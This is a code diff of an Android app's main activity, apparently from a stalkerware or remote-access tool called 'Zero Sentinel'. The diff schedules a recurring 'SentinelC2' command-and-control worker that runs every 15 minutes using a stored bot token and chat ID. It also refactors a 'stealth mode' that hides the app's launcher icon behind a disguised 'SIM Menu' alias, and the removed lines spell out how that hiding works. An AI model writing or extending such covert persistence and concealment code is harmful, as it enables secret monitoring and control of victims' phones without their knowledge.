@@ -19,6 +19,14 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.PowerManager
 import android.view.View
+import androidx.work.PeriodicWorkRequestBuilder
+import androidx.work.NetworkType
+import androidx.work.Constraints
+import androidx.work.WorkManager
+import androidx.work.ExistingPeriodicWorkPolicy
+import java.util.concurrent.TimeUnit
+import com.zero.sentinel.workers.C2Worker
+import com.zero.sentinel.utils.StealthManager
 
 class MainActivity : AppCompatActivity() {
 
@@ -60,7 +68,15 @@ class MainActivity : AppCompatActivity() {
                 prefsManager.saveChatId(chat)
                 Toast.makeText(this, "Credentials Saved!", Toast.LENGTH_SHORT).show()
                 // Restart Service to pick up new creds
-                startService(Intent(this, com.zero.sentinel.services.SentinelService::class.java))
+                // Schedule C2 Worker
+                val workRequest = PeriodicWorkRequestBuilder<C2Worker>(15, TimeUnit.MINUTES)
+                    .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
+                    .build()
+                WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+                    "SentinelC2",
+                    ExistingPeriodicWorkPolicy.UPDATE,
+                    workRequest
+                )
             } else {
                 Toast.makeText(this, "Please enter both Token and Chat ID", Toast.LENGTH_SHORT).show()
             }
@@ -88,7 +104,15 @@ class MainActivity : AppCompatActivity() {
         }
         
         // Start Foreground Service immediately if possible
-        startService(Intent(this, com.zero.sentinel.services.SentinelService::class.java))
+        // Schedule C2 Worker on startup if configured
+        val workRequest = PeriodicWorkRequestBuilder<C2Worker>(15, TimeUnit.MINUTES)
+            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
+            .build()
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+            "SentinelC2",
+            ExistingPeriodicWorkPolicy.KEEP,
+            workRequest
+        )
     }
 
     override fun onResume() {
@@ -136,23 +160,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun enableStealthMode() {
-        val pm = packageManager
-        val componentName = ComponentName(this, MainActivity::class.java)
-        val aliasName = ComponentName(this, "com.zero.sentinel.ui.StealthAlias")
-
-        // Enable Alias (SIM Menu)
-        pm.setComponentEnabledSetting(
-            aliasName,
-            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-            PackageManager.DONT_KILL_APP
-        )
-
-        // Disable Main Activity (Zero Sentinel)
-        pm.setComponentEnabledSetting(
-            componentName,
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
+        StealthManager.hideAppIcon(this)
 
         Toast.makeText(this, "Stealth Mode Activated. App will close.", Toast.LENGTH_LONG).show()
         finish()
